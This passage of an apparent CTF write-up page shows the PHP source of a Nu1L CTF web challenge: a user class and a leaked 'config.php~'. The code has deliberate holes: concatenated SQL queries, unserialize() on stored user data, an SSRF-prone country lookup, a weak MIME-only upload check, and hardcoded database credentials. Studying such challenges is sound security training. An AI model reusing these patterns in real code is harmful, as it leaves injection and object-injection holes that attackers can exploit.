&#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;upload file error&quot;</span>;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showmess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//id,sig,mood,ip,country,subtime</span></span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">            @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select</span>(<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;signature&#x27;</span>,<span class="string">&#x27;mood&#x27;</span>,<span class="string">&#x27;id&#x27;</span>),<span class="string">&#x27;ctf_user_signature&#x27;</span>,<span class="string">&quot;userid = <span class="subst">$this</span>-&gt;userid order by id desc&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ret</span>) &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$ret</span>-&gt;<span class="title function_ invoke__">fetch_row</span>()) &#123;</span><br><span class="line">                    <span class="variable">$sig</span> = <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">                    <span class="variable">$mood</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">                    <span class="variable">$country</span> = <span class="variable">$mood</span>-&gt;<span class="title function_ invoke__">getcountry</span>();</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="variable">$mood</span>-&gt;ip;</span><br><span class="line">                    <span class="variable">$subtime</span> = <span class="variable">$mood</span>-&gt;<span class="title function_ invoke__">getsubtime</span>();</span><br><span class="line">                    <span class="variable">$allmess</span> = <span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>=&gt;<span class="variable">$row</span>[<span class="number">3</span>],<span class="string">&#x27;sig&#x27;</span> =&gt; <span class="variable">$sig</span>, <span class="string">&#x27;mood&#x27;</span> =&gt; <span class="variable">$mood</span>, <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$ip</span>, <span class="string">&#x27;country&#x27;</span> =&gt; <span class="variable">$country</span>, <span class="string">&#x27;subtime&#x27;</span> =&gt; <span class="variable">$subtime</span>);</span><br><span class="line">                    <span class="title function_ invoke__">array_push</span>(<span class="variable">$data</span>, <span class="variable">$allmess</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;adminpic/&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_splice</span>(<span class="variable">$filenames</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$filenames</span>));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">allow_diff_ip_option</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;adio&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>();</span><br><span class="line">                @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_single</span>(<span class="string">&#x27;ctf_users&#x27;</span>,<span class="string">&quot;id = <span class="subst">$this</span>-&gt;userid&quot;</span>,<span class="string">&#x27;allow_diff_ip&#x27;</span>,(<span class="keyword">int</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;adio&#x27;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;admin can\&#x27;t change this option&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deletemess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check_login</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;delid&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$delid</span> = (<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;delid&#x27;</span>];</span><br><span class="line">            <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">Db</span>;</span><br><span class="line">            @<span class="variable">$ret</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">delete</span>(<span class="string">&#x27;ctf_user_signature&#x27;</span>, <span class="string">&quot;userid = <span class="subst">$this</span>-&gt;userid and id = &#x27;<span class="subst">$delid</span>&#x27;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ret</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>config.php~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&quot;PRC&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$username</span> = <span class="string">&quot;Nu1L&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$password</span> = <span class="string">&quot;Nu1Lpassword233334&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$dbname</span> = <span class="string">&quot;nu1lctf&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$this</span>-&gt;servername, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password, <span class="variable">$this</span>-&gt;dbname);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_column</span>(<span class="params"><span class="variable">$columns</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$columns</span>))</span><br><span class="line">            <span class="variable">$column</span> = <span class="string">&#x27; `&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;`,`&#x27;</span>,<span class="variable">$columns</span>).<span class="string">&#x27;` &#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="variable">$column</span> = <span class="string">&#x27; `&#x27;</span>.<span class="variable">$columns</span>.<span class="string">&#x27;` &#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$column</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$columns</span>,<span class="variable">$table</span>,<span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$column</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_column</span>(<span class="variable">$columns</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&#x27;select &#x27;</span>.<span class="variable">$column</span>.<span class="string">&#x27; from &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27; where &#x27;</span>.<span class="variable">$where</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$columns</span>,<span class="variable">$table</span>,<span class="variable">$values</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$column</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_column</span>(<span class="variable">$columns</span>);</span><br><span class="line">        <span class="variable">$value</span> = <span class="string">&#x27;(&#x27;</span>.<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/`([^`,]+)`/&#x27;</span>,<span class="string">&#x27;\&#x27;$&#123;1&#125;\&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get_column</span>(<span class="variable">$values</span>)).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">        <span class="variable">$nid</span> =</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&#x27;insert into &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$column</span>.<span class="string">&#x27;) values &#x27;</span>.<span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$where</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> =  <span class="string">&#x27;delete from &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27; where &#x27;</span>.<span class="variable">$where</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_single</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$where</span>,<span class="variable">$column</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&#x27;update &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27; set `&#x27;</span>.<span class="variable">$column</span>.<span class="string">&#x27;` = \&#x27;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;\&#x27; where &#x27;</span>.<span class="variable">$where</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mood</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mood</span>, <span class="variable">$ip</span>, <span class="variable">$date</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$mood</span>, <span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mood = <span class="variable">$mood</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ip  = <span class="variable">$ip</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;date = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getcountry</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ip</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://ip.taobao.com/service/getIpInfo.php?ip=&quot;</span>.<span class="variable">$this</span>-&gt;ip);</span><br><span class="line">        <span class="variable">$ip</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$ip</span>,<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ip</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;country&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getsubtime</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$now_date</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">        <span class="variable">$sub_date</span> = (<span class="keyword">int</span>)<span class="variable">$now_date</span> - (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;date;</span><br><span class="line">        <span class="variable">$days</span> = (<span class="keyword">int</span>)(<span class="variable">$sub_date</span>/<span class="number">86400</span>);</span><br><span class="line">        <span class="variable">$hours</span> = (<span class="keyword">int</span>)(<span class="variable">$sub_date</span>%<span class="number">86400</span>/<span class="number">3600</span>);</span><br><span class="line">        <span class="variable">$minutes</span> = (<span class="keyword">int</span>)(<span class="variable">$sub_date</span>%<span class="number">86400</span>%<span class="number">3600</span>/<span class="number">60</span>);</span><br><span class="line">        <span class="variable">$res</span> = (<span class="variable">$days</span>&gt;<span class="number">0</span>)?<span class="string">&quot;<span class="subst">$days</span> days <span class="subst">$hours</span> hours <span class="subst">$minutes</span> minutes ago&quot;</span>:((<span class="variable">$hours</span>&gt;<span class="number">0</span>)?<span class="string">&quot;<span class="subst">$hours</span> hours <span class="subst">$minutes</span> minutes ago&quot;</span>:<span class="string">&quot;<span class="subst">$minutes</span> minutes ago&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file_size</span>  = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_size</span>&gt;<span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pic is too big!&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span>!=<span class="string">&quot;image/jpeg&quot;</span> &amp;&amp; <span class="variable">$file_type</span>!=<span class="string">&#x27;image/pjpeg&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;file type invalid&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$uploaded_file</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$user_path</span> =  <span class="string">&quot;/app/adminpic&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$user_path</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$user_path</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>])[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$file_true_name</span>);</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$file_true_name</span>);</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="variable">$file_true_name</span>.<span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">100</span>).<span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">        <span class="variable">$move_to_file</span> = <span class="variable">$user_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_true_name</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$uploaded_file</span>,<span class="variable">$move_to_file</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$move_to_file</span>),<span class="string">&#x27;&lt;?php&#x27;</span>)&gt;=<span class="number">0</span>)</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&#x27;sh /home/nu1lctf/clean_danger.sh&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$file_true_name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_deep</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) ? <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;addslashes_deep&#x27;</span>, <span class="variable">$value</span>) : <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_s</span>(<span class="params"><span class="variable">$length</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_ []&#123;&#125;&lt;&gt;~`+=,.;:/?&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$password</span> .= <span class="variable">$chars</span>[ <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>) - <span class="number">1</span>) ];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addsla_all</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$_GET</span>  = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_GET</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$_POST</span> = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_POST</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_COOKIE</span>   = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line">        <span class="variable">$_REQUEST</span>  = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">addsla_all</span>();</span><br><span class="line"><span 